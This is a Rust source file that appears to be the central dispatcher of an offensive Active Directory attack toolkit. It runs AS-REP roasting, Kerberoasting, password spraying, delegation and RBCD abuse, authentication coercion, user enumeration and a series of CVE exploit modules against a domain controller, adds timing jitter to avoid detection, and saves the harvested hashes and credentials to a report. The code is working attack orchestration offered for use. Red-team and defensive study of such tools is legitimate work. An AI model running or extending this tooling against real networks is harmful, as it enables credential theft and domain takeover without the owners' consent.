//! Top-level orchestrator — dispatches all Kerberos attack actions and
//! collects results into a unified HuntReport.

use crate::asreproast::{AsRepRoastConfig, AsRepRoastResult};
use crate::attacks::{
    AdDsEopResult, CbaBypassResult, ChecksumBypassConfig, Ipv6RceConfig, KrbBypassConfig,
    NetCfgOpsResult, SssdLinuxConfig, WacCompromiseConfig, assess_cba_bypass, compromise_wac,
    exploit_ad_ds_eop, exploit_all_checksum_techniques, exploit_ipv6_rce, exploit_krb_pac_bypass,
    exploit_netcfg_ops, exploit_sssd_linux,
};
use crate::bad_successor::{BadSuccessorResult, exploit_bad_successor};
use crate::coerce::{CoerceConfig, CoerceResult};
use crate::constrained::{ConstrainedConfig, ConstrainedResult};
use crate::kerberoast::{KerberoastConfig, KerberoastResult};
use crate::rbcd::{RbcdConfig, RbcdResult};
use crate::spray::{SprayConfig, SprayResult};
use crate::tickets::TicketRequest;
use crate::unconstrained::{UnconstrainedConfig, UnconstrainedResult};
use crate::userenum::{UserEnumConfig, UserEnumResult};
use chrono::{DateTime, Utc};
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::TicketGrantingData;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{error, info, warn};

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

/// Global hunt configuration shared across all sub-modules
#[derive(Debug, Clone)]
pub struct HuntConfig {
    /// Domain controller IP
    pub dc_ip: String,
    /// Target AD domain (e.g., "corp.local")
    pub domain: String,
    /// Authentication username
    pub username: String,
    /// Authentication secret (password or NT hash)
    pub secret: String,
    /// Whether `secret` is an NTLM hash rather than a password
    pub use_hash: bool,
    /// LDAP base DN (auto-derived from domain if None)
    pub base_dn: Option<String>,
    /// Use LDAPS (636) instead of LDAP (389)
    pub use_ldaps: bool,
    /// Output directory for results
    pub output_dir: PathBuf,
    /// Max concurrent operations
    pub concurrency: usize,
    /// Request timeout in seconds
    pub timeout: u64,
    /// Jitter between requests (ms) to avoid detection
    pub jitter_ms: u64,
    /// Pre-obtained TGT (skip re-authentication if provided)
    pub tgt: Option<TicketGrantingData>,
}

impl HuntConfig {
    /// Derive base DN from domain: "corp.local" → "DC=corp,DC=local"
    pub fn derive_base_dn(&self) -> String {
        if let Some(ref dn) = self.base_dn {
            return dn.clone();
        }
        self.domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(",")
    }

    /// Apply jitter delay between operations
    pub async fn apply_jitter(&self) {
        if self.jitter_ms > 0 {
            let jitter = rand::random::<u64>() % self.jitter_ms;
            tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
        }
    }
}

/// CVE attack selection for the runner.
#[derive(Debug, Clone)]
pub enum CveAttackType {
    /// CVE-2025-53779: BadSuccessor dMSA privilege escalation
    BadSuccessor {
        target_da_dn: String,
        auto_cleanup: bool,
    },
    /// CVE-2025-21293: Network Configuration Operators EoP
    NetCfgOps { dll_path: Option<String> },
    /// CVE-2025-21299: Kerberos PAC signature bypass
    KrbPacBypass(KrbBypassConfig),
    /// CVE-2025-26647: Kerberos CBA NTAuth store bypass
    CbaBypass,
    /// CVE-2025-60704: S4U checksum validation bypass
    ChecksumBypass(ChecksumBypassConfig),
    /// CVE-2025-11561: SSSD Linux impersonation
    SssdLinux(SssdLinuxConfig),
    /// CVE-2026-25177: AD DS EoP via DACL bypass
    AdDsEop,
    /// CVE-2026-26119: Windows Admin Center compromise
    WacCompromise(WacCompromiseConfig),
    /// CVE-2024-38063: IPv6 fragment RCE
    Ipv6Rce(Ipv6RceConfig),
    /// CVE-2024-21410: Exchange NTLM relay
    ExchangeRelay {
        target_exchange: String,
        relay_port: u16,
    },
}

impl CveAttackType {
    /// Human-readable CVE ID
    pub fn cve_id(&self) -> &'static str {
        match self {
            Self::BadSuccessor { .. } => "CVE-2025-53779",
            Self::NetCfgOps { .. } => "CVE-2025-21293",
            Self::KrbPacBypass(_) => "CVE-2025-21299",
            Self::CbaBypass => "CVE-2025-26647",
            Self::ChecksumBypass(_) => "CVE-2025-60704",
            Self::SssdLinux(_) => "CVE-2025-11561",
            Self::AdDsEop => "CVE-2026-25177",
            Self::WacCompromise(_) => "CVE-2026-26119",
            Self::Ipv6Rce(_) => "CVE-2024-38063",
            Self::ExchangeRelay { .. } => "CVE-2024-21410",
        }
    }

    /// Short name for display
    pub fn name(&self) -> &'static str {
        match self {
            Self::BadSuccessor { .. } => "BadSuccessor dMSA",
            Self::NetCfgOps { .. } => "NetCfgOps EoP",
            Self::KrbPacBypass(_) => "Kerberos PAC Bypass",
            Self::CbaBypass => "CBA NTAuth Bypass",
            Self::ChecksumBypass(_) => "CheckSum S4U",
            Self::SssdLinux(_) => "SSSD Linux Impersonation",
            Self::AdDsEop => "AD DS EoP",
            Self::WacCompromise(_) => "WAC Compromise",
            Self::Ipv6Rce(_) => "IPv6 RCE",
            Self::ExchangeRelay { .. } => "Exchange Relay",
        }
    }
}

/// What action the hunter should perform
#[derive(Debug, Clone)]
pub enum HuntAction {
    /// Enumerate & roast DONT_REQ_PREAUTH accounts
    AsRepRoast(AsRepRoastConfig),
    /// Enumerate SPN accounts & extract TGS hashes
    Kerberoast(KerberoastConfig),
    /// Perform a lockout-safe password spray
    Spray(SprayConfig),
    /// Abuse constrained delegation via S4U chain
    ConstrainedDelegation(ConstrainedConfig),
    /// Discover unconstrained delegation hosts
    UnconstrainedDelegation(UnconstrainedConfig),
    /// Perform RBCD attack
    Rbcd(RbcdConfig),
    /// Authentication coercion attacks
    Coerce(CoerceConfig),
    /// Ticket operations (request, convert, import/export)
    Ticket(TicketRequest),
    /// Kerberos username enumeration (zero-knowledge, no creds needed)
    UserEnum(UserEnumConfig),
    /// CVE-based attack module
    CveAttack(CveAttackType),
    /// Run all enumeration scans
    FullScan,
}

// ═══════════════════════════════════════════════════════════
// Report
// ═══════════════════════════════════════════════════════════

/// Result of a single CVE-based attack execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CveAttackResult {
    /// CVE identifier (e.g. "CVE-2025-53779")
    pub cve_id: String,
    /// Human-readable name
    pub name: String,
    /// Whether the attack succeeded
    pub success: bool,
    /// Summary of findings
    pub summary: String,
    /// Detailed log entries
    pub log: Vec<String>,
}

/// Unified report from all hunt actions
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HuntReport {
    /// Domain FQDN
    pub domain: String,
    /// Domain controller IP address
    pub dc_ip: String,
    /// started at field
    pub started_at: DateTime<Utc>,
    /// completed at field
    pub completed_at: Option<DateTime<Utc>>,
    /// asreproast field
    pub asreproast: Option<AsRepRoastResult>,
    /// kerberoast field
    pub kerberoast: Option<KerberoastResult>,
    /// spray field
    pub spray: Option<SprayResult>,
    /// constrained field
    pub constrained: Option<ConstrainedResult>,
    /// unconstrained field
    pub unconstrained: Option<UnconstrainedResult>,
    /// rbcd field
    pub rbcd: Option<RbcdResult>,
    /// coerce field
    pub coerce: Option<CoerceResult>,
    /// user enum field
    pub user_enum: Option<UserEnumResult>,
    /// CVE attack results
    pub cve_results: Vec<CveAttackResult>,
    /// Error information
    pub errors: Vec<String>,
}

impl HuntReport {
    fn new(config: &HuntConfig) -> Self {
        Self {
            domain: config.domain.clone(),
            dc_ip: config.dc_ip.clone(),
            started_at: Utc::now(),
            completed_at: None,
            asreproast: None,
            kerberoast: None,
            spray: None,
            constrained: None,
            unconstrained: None,
            rbcd: None,
            coerce: None,
            user_enum: None,
            cve_results: Vec::new(),
            errors: Vec::new(),
        }
    }

    /// Total number of findings across all modules
    pub fn total_findings(&self) -> usize {
        let mut count = 0;
        if let Some(ref r) = self.asreproast {
            count += r.hashes.len();
        }
        if let Some(ref r) = self.kerberoast {
            count += r.hashes.len();
        }
        if let Some(ref r) = self.spray {
            count += r.valid_creds.len();
        }
        if let Some(ref r) = self.constrained {
            count += r.delegatable_accounts.len();
        }
        if let Some(ref r) = self.unconstrained {
            count += r.vulnerable_hosts.len();
        }
        if let Some(ref r) = self.rbcd
            && r.success
        {
            count += 1;
        }
        if let Some(ref r) = self.coerce {
            count += r.successful_coercions.len();
        }
        if let Some(ref r) = self.user_enum {
            count += r.valid_users.len() + r.no_preauth_users.len();
        }
        count += self.cve_results.iter().filter(|r| r.success).count();
        count
    }

    /// Pretty-print the report summary
    pub fn print_summary(&self) {
        println!("\n{}", "═══ HUNT REPORT ═══".bold().cyan());
        println!("  Domain:  {}", self.domain.bold());
        println!("  DC:      {}", self.dc_ip);
        println!(
            "  Started: {}",
            self.started_at.format("%Y-%m-%d %H:%M:%S UTC")
        );
        if let Some(completed) = self.completed_at {
            let duration = completed - self.started_at;
            println!("  Duration: {}s", duration.num_seconds());
        }
        println!();

        if let Some(ref r) = self.asreproast {
            println!(
                "  {} AS-REP Roast: {} hashes from {} targets",
                if r.hashes.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.hashes.len().to_string().bold(),
                r.users_checked,
            );
        }
        if let Some(ref r) = self.kerberoast {
            println!(
                "  {} Kerberoast:   {} hashes from {} SPNs",
                if r.hashes.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.hashes.len().to_string().bold(),
                r.spns_checked,
            );
        }
        if let Some(ref r) = self.spray {
            println!(
                "  {} Spray:        {} valid creds, {} lockouts, {} attempts",
                if r.valid_creds.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.valid_creds.len().to_string().bold(),
                r.locked_out.len(),
                r.attempts,
            );
        }
        if let Some(ref r) = self.constrained {
            println!(
                "  {} Constrained:  {} delegatable accounts",
                if r.delegatable_accounts.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.delegatable_accounts.len().to_string().bold(),
            );
        }
        if let Some(ref r) = self.unconstrained {
            println!(
                "  {} Unconstrained: {} vulnerable hosts",
                if r.vulnerable_hosts.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.vulnerable_hosts.len().to_string().bold(),
            );
        }
        if let Some(ref r) = self.rbcd {
            println!(
                "  {} RBCD: {}",
                if r.success {
                    "✓".green()
                } else {
                    "✗".red()
                },
                if r.success {
                    "delegation configured"
                } else {
                    "not performed"
                },
            );
        }
        if let Some(ref r) = self.coerce {
            println!(
                "  {} Coerce: {}/{} methods succeeded",
                if r.successful_coercions.is_empty() {
                    "✗".red()
                } else {
                    "✓".green()
                },
                r.successful_coercions.len(),
                r.methods_attempted,
            );
        }

        // CVE attack results
        for r in &self.cve_results {
            let icon = if r.success {
                "✓".green()
            } else {
                "✗".red()
            };
            println!("  {} {} ({}): {}", icon, r.cve_id, r.name, r.summary);
        }

        if !self.errors.is_empty() {
            println!("\n  {} Errors:", "⚠".yellow());
            for e in &self.errors {
                println!("    • {}", e.red());
            }
        }

        println!(
            "\n  {} Total findings: {}",
            "→".cyan(),
            self.total_findings().to_string().bold()
        );
        println!("{}\n", "═══════════════════".cyan());
    }

    /// Export report to JSON
    pub fn to_json(&self) -> Result<String> {
        serde_json::to_string_pretty(self).map_err(OverthroneError::custom)
    }

    /// Save report to file
    pub async fn save(&self, path: &std::path::Path) -> Result<()> {
        let json = self.to_json()?;
        tokio::fs::write(path, &json).await?;
        info!("Report saved to {}", path.display());
        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════
// CVE Attack Dispatcher
// ═══════════════════════════════════════════════════════════

async fn dispatch_cve_attack(config: &HuntConfig, attack: &CveAttackType) -> CveAttackResult {
    let cve_id = attack.cve_id();
    let name = attack.name();
    let log = |msg: String| format!("[{}] {}", name, msg);

    info!("Running CVE attack: {} ({})", name, cve_id);

    match attack {
        CveAttackType::BadSuccessor {
            target_da_dn,
            auto_cleanup,
        } => match run_cve_bad_successor(config, target_da_dn, *auto_cleanup).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: true,
                summary: format!("TGT obtained for {}", target_da_dn),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::NetCfgOps { dll_path } => {
            match run_cve_netcfgops(config, dll_path.as_deref()).await {
                Ok(result) => CveAttackResult {
                    cve_id: cve_id.to_string(),
                    name: name.to_string(),
                    success: result.exploit_success,
                    summary: format!(
                        "Member: {}, members: {}",
                        result.is_member, result.member_count
                    ),
                    log: result.log,
                },
                Err(e) => CveAttackResult {
                    cve_id: cve_id.to_string(),
                    name: name.to_string(),
                    success: false,
                    summary: format!("Failed: {e}"),
                    log: vec![log(format!("Error: {e}"))],
                },
            }
        }
        CveAttackType::KrbPacBypass(kc) => match exploit_krb_pac_bypass(kc).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.success,
                summary: format!("Technique: {:?}", result.technique),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::CbaBypass => match run_cve_cba_bypass(config).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.has_exploitable_template,
                summary: format!("CAs outside NTAuth: {}", result.non_nt_auth_cas.len()),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::ChecksumBypass(cc) => {
            let results = exploit_all_checksum_techniques(cc).await;
            let succeeded = results.iter().filter(|r| r.success).count();
            let logs: Vec<String> = results.iter().flat_map(|r| r.log.clone()).collect();
            CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: succeeded > 0,
                summary: format!("{}/4 techniques succeeded", succeeded),
                log: logs,
            }
        }
        CveAttackType::SssdLinux(sc) => match exploit_sssd_linux(sc).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.access_gained,
                summary: format!("Technique: {:?}", result.technique),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::AdDsEop => match run_cve_ad_ds_eop(config).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.vulnerable,
                summary: format!(
                    "Build version: {:?}, vulnerable: {}",
                    result.dc_build_version, result.vulnerable
                ),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::WacCompromise(wc) => match compromise_wac(wc).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.access_obtained,
                summary: format!(
                    "Servers: {}, auth: {:?}",
                    result.managed_servers.len(),
                    result.auth_methods
                ),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::Ipv6Rce(ic) => match exploit_ipv6_rce(ic).await {
            Ok(result) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: result.success,
                summary: format!("Target: {}, payload: {:?}", result.target, result.payload),
                log: result.log,
            },
            Err(e) => CveAttackResult {
                cve_id: cve_id.to_string(),
                name: name.to_string(),
                success: false,
                summary: format!("Failed: {e}"),
                log: vec![log(format!("Error: {e}"))],
            },
        },
        CveAttackType::ExchangeRelay {
            target_exchange,
            relay_port,
        } => CveAttackResult {
            cve_id: cve_id.to_string(),
            name: name.to_string(),
            success: false,
            summary: format!(
                "Stub — use overthrone-relay standalone (Exchange: {target_exchange}:{relay_port})"
            ),
            log: vec![log(
                "Exchange relay requires the standalone relay crate".into()
            )],
        },
    }
}

// ═══════════════════════════════════════════════════════════
// CVE-specific runners (establish connections, call modules)
// ═══════════════════════════════════════════════════════════

/// Helper: create an authenticated LDAP session from HuntConfig
async fn connect_ldap(config: &HuntConfig) -> Result<overthrone_core::proto::ldap::LdapSession> {
    use overthrone_core::proto::ldap::LdapSession;

    if config.use_hash {
        LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await
    } else {
        LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await
    }
}

async fn run_cve_bad_successor(
    config: &HuntConfig,
    target_da_dn: &str,
    auto_cleanup: bool,
) -> Result<BadSuccessorResult> {
    let mut ldap = connect_ldap(config).await?;
    exploit_bad_successor(
        &mut ldap,
        &config.dc_ip,
        &config.domain,
        target_da_dn,
        auto_cleanup,
    )
    .await
}

async fn run_cve_netcfgops(config: &HuntConfig, dll_path: Option<&str>) -> Result<NetCfgOpsResult> {
    let mut ldap = connect_ldap(config).await?;

    // Attempt SMB connection for remote registry write
    let mut smb = None;
    let target_host = if config.dc_ip.is_empty() {
        None
    } else {
        Some(config.dc_ip.clone())
    };

    if let Some(host) = &target_host {
        let smb_result = if config.use_hash {
            overthrone_core::proto::smb::SmbSession::connect_with_hash(
                host,
                &config.domain,
                &config.username,
                &config.secret,
            )
            .await
        } else {
            overthrone_core::proto::smb::SmbSession::connect(
                host,
                &config.domain,
                &config.username,
                &config.secret,
            )
            .await
        };
        match smb_result {
            Ok(s) => {
                info!("SMB session established to \\\\{host} for NetCfgOps registry write");
                smb = Some(s);
            }
            Err(e) => {
                info!("SMB session to \\\\{host} failed (will document manual steps): {e}");
                smb = None;
            }
        }
    }

    let result =
        exploit_netcfg_ops(&mut ldap, dll_path, smb.as_mut(), target_host.as_deref()).await?;
    Ok(result)
}

async fn run_cve_cba_bypass(config: &HuntConfig) -> Result<CbaBypassResult> {
    let mut ldap = connect_ldap(config).await?;
    assess_cba_bypass(&mut ldap).await
}

async fn run_cve_ad_ds_eop(config: &HuntConfig) -> Result<AdDsEopResult> {
    let mut ldap = connect_ldap(config).await?;
    exploit_ad_ds_eop(&mut ldap, &config.dc_ip, None).await
}

// ═══════════════════════════════════════════════════════════
// Main Dispatcher
// ═══════════════════════════════════════════════════════════

/// Run one or more hunt actions and produce a unified report.
pub async fn run_hunt(config: &HuntConfig, actions: &[HuntAction]) -> Result<HuntReport> {
    let mut report = HuntReport::new(config);
    info!("Starting hunt against {} ({})", config.domain, config.dc_ip);

    for action in actions {
        match action {
            HuntAction::AsRepRoast(ac) => match crate::asreproast::run(config, ac).await {
                Ok(result) => report.asreproast = Some(result),
                Err(e) => {
                    error!("AS-REP Roast failed: {e}");
                    report.errors.push(format!("asreproast: {e}"));
                }
            },
            HuntAction::Kerberoast(kc) => match crate::kerberoast::run(config, kc).await {
                Ok(result) => report.kerberoast = Some(result),
                Err(e) => {
                    error!("Kerberoast failed: {e}");
                    report.errors.push(format!("kerberoast: {e}"));
                }
            },
            HuntAction::Spray(sc) => match crate::spray::run_spray(config, sc).await {
                Ok(result) => report.spray = Some(result),
                Err(e) => {
                    error!("Spray failed: {e}");
                    report.errors.push(format!("spray: {e}"));
                }
            },
            HuntAction::ConstrainedDelegation(cc) => {
                match crate::constrained::run(config, cc).await {
                    Ok(result) => report.constrained = Some(result),
                    Err(e) => {
                        error!("Constrained delegation scan failed: {e}");
                        report.errors.push(format!("constrained: {e}"));
                    }
                }
            }
            HuntAction::UnconstrainedDelegation(uc) => {
                match crate::unconstrained::run(config, uc).await {
                    Ok(result) => report.unconstrained = Some(result),
                    Err(e) => {
                        error!("Unconstrained delegation scan failed: {e}");
                        report.errors.push(format!("unconstrained: {e}"));
                    }
                }
            }
            HuntAction::Rbcd(rc) => match crate::rbcd::run(config, rc).await {
                Ok(result) => report.rbcd = Some(result),
                Err(e) => {
                    error!("RBCD attack failed: {e}");
                    report.errors.push(format!("rbcd: {e}"));
                }
            },
            HuntAction::Coerce(cc) => match crate::coerce::run(config, cc).await {
                Ok(result) => report.coerce = Some(result),
                Err(e) => {
                    error!("Coercion failed: {e}");
                    report.errors.push(format!("coerce: {e}"));
                }
            },
            HuntAction::Ticket(tr) => match crate::tickets::handle_request(config, tr).await {
                Ok(_) => info!("Ticket operation completed"),
                Err(e) => {
                    error!("Ticket operation failed: {e}");
                    report.errors.push(format!("ticket: {e}"));
                }
            },
            HuntAction::UserEnum(uc) => {
                match crate::userenum::run(&config.dc_ip, &config.domain, uc, config.jitter_ms)
                    .await
                {
                    Ok(result) => report.user_enum = Some(result),
                    Err(e) => {
                        error!("User enumeration failed: {e}");
                        report.errors.push(format!("userenum: {e}"));
                    }
                }
            }
            HuntAction::CveAttack(attack) => {
                let result = dispatch_cve_attack(config, attack).await;
                if result.success {
                    info!("CVE attack succeeded: {} ({})", result.name, result.cve_id);
                } else {
                    warn!(
                        "CVE attack failed: {} ({}) — {}",
                        result.name, result.cve_id, result.summary
                    );
                }
                report.cve_results.push(result);
            }
            HuntAction::FullScan => {
                info!("Running full enumeration scan...");
                let asrep_cfg = AsRepRoastConfig::default();
                match crate::asreproast::run(config, &asrep_cfg).await {
                    Ok(r) => report.asreproast = Some(r),
                    Err(e) => report.errors.push(format!("asreproast: {e}")),
                }

                let kerb_cfg = KerberoastConfig::default();
                match crate::kerberoast::run(config, &kerb_cfg).await {
                    Ok(r) => report.kerberoast = Some(r),
                    Err(e) => report.errors.push(format!("kerberoast: {e}")),
                }

                let cd_cfg = ConstrainedConfig::default();
                match crate::constrained::run(config, &cd_cfg).await {
                    Ok(r) => report.constrained = Some(r),
                    Err(e) => report.errors.push(format!("constrained: {e}")),
                }

                let ud_cfg = UnconstrainedConfig::default();
                match crate::unconstrained::run(config, &ud_cfg).await {
                    Ok(r) => report.unconstrained = Some(r),
                    Err(e) => report.errors.push(format!("unconstrained: {e}")),
                }
            }
        }
        config.apply_jitter().await;
    }

    report.completed_at = Some(Utc::now());
    report.print_summary();

    let report_path = config.output_dir.join(format!(
        "hunt_{}_{}.json",
        config.domain.replace('.', "_"),
        Utc::now().format("%Y%m%d_%H%M%S")
    ));
    if let Err(e) = report.save(&report_path).await {
        warn!("Could not save report: {e}");
    }

    Ok(report)
}
